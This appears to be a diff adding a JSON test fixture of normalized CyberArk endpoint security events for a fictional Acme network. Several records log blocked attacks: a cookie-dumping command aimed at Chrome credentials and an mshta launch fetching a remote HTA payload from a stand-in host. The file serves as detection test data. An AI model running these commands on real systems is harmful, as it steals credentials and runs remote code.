@@ -1,0 +1,450 @@
+[
+  {
+    "line": 1,
+    "extractor_path": "CYBERARK_EPM_JSON_PARENT > CYBERARK_EPM_JSON_CHILD_PROCESS",
+    "schema": "scwx.process",
+    "normalized": {
+      "sensor_type": "CyberArk Endpoint Privilege Manager",
+      "event_time_usec": 1791940816069000,
+      "event_time_fidelity": "MICRO",
+      "image_path": "C:\\Program Files\\Acme\\Report Builder\\reportbuilder.exe",
+      "process": "reportbuilder.exe",
+      "username": "ACME\\akim",
+      "program_hash": {
+        "sha1": "5B97884A45C6C05F93B22C4059F3D9189E88E8B7"
+      },
+      "computer_name": "FIN-LT-041",
+      "host_id": "FIN-LT-041",
+      "user_is_admin": false
+    }
+  },
+  {
+    "line": 2,
+    "extractor_path": "CYBERARK_EPM_JSON_PARENT > CYBERARK_EPM_JSON_CHILD_THIRDPARTYALERT",
+    "schema": "scwx.thirdpartyalert",
+    "normalized": {
+      "sensor_type": "CyberArk Endpoint Privilege Manager",
+      "event_time_usec": 1791942175300000,
+      "event_time_fidelity": "MICRO",
+      "vendor": "CyberArk",
+      "provider": "CyberArk Endpoint Privilege Manager",
+      "log_type": "raw_event",
+      "alert_category": "ElevationRequest",
+      "title": "ElevationRequest",
+      "summary": "ElevationRequest Label Printer Driver Setup (labelprinter_setup.exe)",
+      "target_host_name": "OPS-LT-112",
+      "host_id": "OPS-LT-112",
+      "source_user_name": "ACME\\pexample",
+      "first_event_time_usec": 1791942175300000,
+      "last_event_time_usec": 1791942175300000,
+      "severity": "INFO",
+      "additional_data": {
+        "record": [
+          {
+            "key": "set_name",
+            "value": "Acme Workstations"
+          },
+          {
+            "key": "set_id",
+            "value": "0f1e2d3c-4b5a-4968-8776-a5b4c3d2e1f0"
+          },
+          {
+            "key": "event_type",
+            "value": "ElevationRequest"
+          },
+          {
+            "key": "file_path",
+            "value": "C:\\Users\\pexample\\Downloads\\labelprinter_setup.exe"
+          },
+          {
+            "key": "sha1",
+            "value": "9A0C1B2D3E4F5061728394A5B6C7D8E9F0A1B2C3"
+          },
+          {
+            "key": "publisher",
+            "value": "Contoso Printing Ltd"
+          },
+          {
+            "key": "justification",
+            "value": "Install the new label printer driver"
+          },
+          {
+            "key": "jit_request_hours",
+            "value": "2"
+          },
+          {
+            "key": "agent_id",
+            "value": "5c6d7e8f-9a0b-4c1d-8e2f-3a4b5c6d7e8f"
+          }
+        ]
+      }
+    }
+  },
+  {
+    "line": 3,
+    "extractor_path": "CYBERARK_EPM_JSON_PARENT > CYBERARK_EPM_JSON_CHILD_THIRDPARTYALERT",
+    "schema": "scwx.thirdpartyalert",
+    "normalized": {
+      "sensor_type": "CyberArk Endpoint Privilege Manager",
+      "event_time_usec": 1791943531000000,
+      "event_time_fidelity": "MICRO",
+      "vendor": "CyberArk",
+      "provider": "CyberArk Endpoint Privilege Manager",
+      "log_type": "raw_event",
+      "alert_category": "AttackBlock",
+      "title": "AttackBlock: Protect browser stored credentials",
+      "summary": "AttackBlock cookiedump.exe",
+      "target_host_name": "FIN-LT-041",
+      "host_id": "FIN-LT-041",
+      "source_user_name": "ACME\\akim",
+      "first_event_time_usec": 1791943531000000,
+      "last_event_time_usec": 1791943531000000,
+      "severity": "HIGH",
+      "action": "BLOCKED",
+      "additional_data": {
+        "record": [
+          {
+            "key": "set_name",
+            "value": "Acme Workstations"
+          },
+          {
+            "key": "set_id",
+            "value": "0f1e2d3c-4b5a-4968-8776-a5b4c3d2e1f0"
+          },
+          {
+            "key": "event_type",
+            "value": "AttackBlock"
+          },
+          {
+            "key": "file_path",
+            "value": "C:\\Users\\akim\\AppData\\Local\\Temp\\cookiedump.exe"
+          },
+          {
+            "key": "sha1",
+            "value": "2F3E4D5C6B7A8091A2B3C4D5E6F708192A3B4C5D"
+          },
+          {
+            "key": "policy_name",
+            "value": "Protect browser stored credentials"
+          },
+          {
+            "key": "threat_protection_action",
+            "value": "Block"
+          },
+          {
+            "key": "command_line",
+            "value": "cookiedump.exe --browser chrome --out C:\\Users\\akim\\AppData\\Local\\Temp\\c.txt"
+          },
+          {
+            "key": "source_process_command_line",
+            "value": "\"C:\\Windows\\System32\\cmd.exe\" /c cookiedump.exe --browser chrome"
+          },
+          {
+            "key": "source_process_hash",
+            "value": "8DCA9749CD48D286950E7A9FA1088C937CBCCAD4"
+          },
+          {
+            "key": "exposed_users",
+            "value": "[\"ACME\\\\akim\"]"
+          },
+          {
+            "key": "agent_id",
+            "value": "78350d3c-5960-4f39-975a-ed07b53924a4"
+          }
+        ]
+      }
+    }
+  },
+  {
+    "line": 4,
+    "extractor_path": "CYBERARK_EPM_JSON_PARENT > CYBERARK_EPM_JSON_CHILD_THIRDPARTYALERT",
+    "schema": "scwx.thirdpartyalert",
+    "normalized": {
+      "sensor_type": "CyberArk Endpoint Privilege Manager",
+      "event_time_usec": 1791945068000000,
+      "event_time_fidelity": "MICRO",
+      "vendor": "CyberArk",
+      "provider": "CyberArk Endpoint Privilege Manager",
+      "log_type": "raw_event",
+      "alert_category": "SuspiciousActivityAttempt",
+      "title": "SuspiciousActivityAttempt: Detect use of credential lures",
+      "summary": "SuspiciousActivityAttempt lsass.exe",
+      "target_host_name": "OPS-SRV-07",
+      "host_id": "OPS-SRV-07",
+      "source_user_name": "NT AUTHORITY\\SYSTEM",
+      "first_event_time_usec": 1791945068000000,
+      "last_event_time_usec": 1791945068000000,
+      "source_address": "198.51.100.66",
+      "source_host_name": "WS-UNKNOWN-22",
+      "severity": "MEDIUM",
+      "action": "ATTEMPTED",
+      "additional_data": {
+        "record": [
+          {
+            "key": "set_name",
+            "value": "Acme Workstations"
+          },
+          {
+            "key": "set_id",
+            "value": "0f1e2d3c-4b5a-4968-8776-a5b4c3d2e1f0"
+          },
+          {
+            "key": "event_type",
+            "value": "SuspiciousActivityAttempt"
+          },
+          {
+            "key": "file_path",
+            "value": "C:\\Windows\\System32\\lsass.exe"
+          },
+          {
+            "key": "policy_name",
+            "value": "Detect use of credential lures"
+          },
+          {
+            "key": "threat_protection_action",
+            "value": "Detect"
+          },
+          {
+            "key": "lure_user",
+            "value": "ACME\\svc-sqlbackup"
+          },
+          {
+            "key": "logon_status_id",
+            "value": "3221225578"
+          },
+          {
+            "key": "logon_attempt_type_id",
+            "value": "3"
+          },
+          {
+            "key": "agent_id",
+            "value": "1a2b3c4d-5e6f-4a7b-8c9d-0e1f2a3b4c5d"
+          }
+        ]
+      }
+    }
+  },
+  {
+    "line": 5,
+    "extractor_path": "CYBERARK_EPM_JSON_PARENT > CYBERARK_EPM_JSON_CHILD_THIRDPARTYALERT",
+    "schema": "scwx.thirdpartyalert",
+    "normalized": {
+      "sensor_type": "CyberArk Endpoint Privilege Manager",
+      "event_time_usec": 1791946964500000,
+      "event_time_fidelity": "MICRO",
+      "vendor": "CyberArk",
+      "provider": "CyberArk Endpoint Privilege Manager",
+      "log_type": "raw_event",
+      "alert_category": "Block",
+      "title": "Block",
+      "summary": "Block Remote Helper (remote-helper.exe)",
+      "target_host_name": "OPS-LT-112",
+      "host_id": "OPS-LT-112",
+      "source_user_name": "ACME\\pexample",
+      "first_event_time_usec": 1791946681200000,
+      "last_event_time_usec": 1791946964500000,
+      "severity": "LOW",
+      "action": "BLOCKED",
+      "additional_data": {
+        "record": [
+          {
+            "key": "set_name",
+            "value": "Acme Workstations"
+          },
+          {
+            "key": "set_id",
+            "value": "0f1e2d3c-4b5a-4968-8776-a5b4c3d2e1f0"
+          },
+          {
+            "key": "event_type",
+            "value": "Block"
+          },
+          {
+            "key": "file_path",
+            "value": "C:\\Users\\pexample\\Downloads\\remote-helper.exe"
+          },
+          {
+            "key": "sha1",
+            "value": "C4D5E6F708192A3B4C5D6E7F8091A2B3C4D5E6F7"
+          },
+          {
+            "key": "agent_event_count",
+            "value": "3"
+          },
+          {
+            "key": "agent_id",
+            "value": "5c6d7e8f-9a0b-4c1d-8e2f-3a4b5c6d7e8f"
+          }
+        ]
+      }
+    }
+  },
+  {
+    "line": 6,
+    "extractor_path": "CYBERARK_EPM_JSON_PARENT > CYBERARK_EPM_JSON_CHILD_PROCESS",
+    "schema": "scwx.process",
+    "normalized": {
+      "sensor_type": "CyberArk Endpoint Privilege Manager",
+      "event_time_usec": 1791948013640000,
+      "event_time_fidelity": "MICRO",
+      "image_path": "C:\\Windows\\Installer\\timesheets-x64.msi",
+      "process": "timesheets-x64.msi",
+      "username": "ACME\\it.admin",
+      "program_hash": {
+        "sha1": "6E7F8091A2B3C4D5E6F708192A3B4C5D6E7F8091"
+      },
+      "computer_name": "FIN-LT-041",
+      "host_id": "FIN-LT-041",
+      "user_is_admin": true
+    }
+  },
+  {
+    "line": 7,
+    "extractor_path": "CYBERARK_EPM_JSON_PARENT > CYBERARK_EPM_JSON_CHILD_THIRDPARTYALERT",
+    "schema": "scwx.thirdpartyalert",
+    "normalized": {
+      "sensor_type": "CyberArk Endpoint Privilege Manager",
+      "event_time_usec": 1791949708334000,
+      "event_time_fidelity": "MICRO",
+      "vendor": "CyberArk",
+      "provider": "CyberArk Endpoint Privilege Manager",
+      "log_type": "policy_audit",
+      "alert_category": "Block",
+      "title": "Block: Block script hosts for standard users",
+      "summary": "Block Microsoft (R) HTML Application host (mshta.exe)",
+      "target_host_name": "OPS-LT-112",
+      "host_id": "OPS-LT-112",
+      "source_user_name": "ACME\\pexample",
+      "first_event_time_usec": 1791949708334000,
+      "last_event_time_usec": 1791949708334000,
+      "severity": "LOW",
+      "action": "BLOCKED",
+      "additional_data": {
+        "record": [
+          {
+            "key": "set_name",
+            "value": "Acme Workstations"
+          },
+          {
+            "key": "set_id",
+            "value": "0f1e2d3c-4b5a-4968-8776-a5b4c3d2e1f0"
+          },
+          {
+            "key": "event_type",
+            "value": "Block"
+          },
+          {
+            "key": "file_path",
+            "value": "C:\\Windows\\System32\\mshta.exe"
+          },
+          {
+            "key": "sha1",
+            "value": "30A89E38CAF7A4C9AA7D7047C366DF215D4724EF"
+          },
+          {
+            "key": "publisher",
+            "value": "Microsoft Windows"
+          },
+          {
+            "key": "policy_name",
+            "value": "Block script hosts for standard users"
+          },
+          {
+            "key": "policy_action",
+            "value": "Block"
+          },
+          {
+            "key": "arguments",
+            "value": "https://payload.example.org/a.hta"
+          },
+          {
+            "key": "agent_id",
+            "value": "5c6d7e8f-9a0b-4c1d-8e2f-3a4b5c6d7e8f"
+          }
+        ]
+      }
+    }
+  },
+  {
+    "line": 8,
+    "extractor_path": "CYBERARK_EPM_JSON_PARENT > CYBERARK_EPM_JSON_CHILD_THIRDPARTYALERT",
+    "schema": "scwx.thirdpartyalert",
+    "normalized": {
+      "sensor_type": "CyberArk Endpoint Privilege Manager",
+      "event_time_usec": 1791950710020000,
+      "event_time_fidelity": "MICRO",
+      "vendor": "CyberArk",
+      "provider": "CyberArk Endpoint Privilege Manager",
+      "log_type": "policy_audit",
+      "alert_category": "ElevationRequest",
+      "title": "ElevationRequest: Elevate DB Admin for DBAs",
+      "summary": "ElevationRequest Database Admin Console (dbadmin.exe)",
+      "target_host_name": "FIN-LT-041",
+      "host_id": "FIN-LT-041",
+      "source_user_name": "ACME\\akim",
+      "first_event_time_usec": 1791950710020000,
+      "last_event_time_usec": 1791950710020000,
+      "severity": "INFO",
+      "action": "SUCCEEDED",
+      "additional_data": {
+        "record": [
+          {
+            "key": "set_name",
+            "value": "Acme Workstations"
+          },
+          {
+            "key": "set_id",
+            "value": "0f1e2d3c-4b5a-4968-8776-a5b4c3d2e1f0"
+          },
+          {
+            "key": "event_type",
+            "value": "ElevationRequest"
+          },
+          {
+            "key": "file_path",
+            "value": "C:\\Program Files\\Acme\\DB Admin\\dbadmin.exe"
+          },
+          {
+            "key": "sha1",
+            "value": "7F8091A2B3C4D5E6F708192A3B4C5D6E7F8091A2"
+          },
+          {
+            "key": "publisher",
+            "value": "Acme Software Pty Ltd"
+          },
+          {
+            "key": "policy_name",
+            "value": "Elevate DB Admin for DBAs"
+          },
+          {
+            "key": "policy_action",
+            "value": "Elevate"
+          },
+          {
+            "key": "agent_id",
+            "value": "78350d3c-5960-4f39-975a-ed07b53924a4"
+          }
+        ]
+      }
+    }
+  },
+  {
+    "line": 9,
+    "extractor_path": "CYBERARK_EPM_JSON_PARENT > CYBERARK_EPM_JSON_CHILD_PROCESS",
+    "schema": "scwx.process",
+    "normalized": {
+      "sensor_type": "CyberArk Endpoint Privilege Manager",
+      "event_time_usec": 1791951767118000,
+      "event_time_fidelity": "MICRO",
+      "image_path": "/Applications/Acme Sync.app/Contents/MacOS/Acme Sync",
+      "process": "Acme Sync",
+      "username": "pat.example",
+      "program_hash": {
+        "sha1": "91A2B3C4D5E6F708192A3B4C5D6E7F8091A2B3C4"
+      },
+      "computer_name": "MAC-DESIGN-03",
+      "host_id": "MAC-DESIGN-03",
+      "user_is_admin": false
+    }
+  }
+]
